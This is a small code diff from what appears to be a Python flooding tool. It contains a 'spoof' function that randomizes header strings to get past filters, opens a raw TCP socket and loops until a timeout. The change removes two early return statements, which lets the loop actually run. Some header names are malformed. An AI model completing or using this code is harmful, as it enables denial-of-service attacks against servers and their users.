@@ -49,8 +49,6 @@ def spoof():
     reffer = "RefTo: "+random.choice(ref)+"\r\n"
     acceptall = "AcceptAll: "+random.choice(acceptall)+random.choice(ref)
     bypass_user = UserAgent + reffer + acceptall + "\r\n"
-    return byte1
-    return byte2
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
     while True:
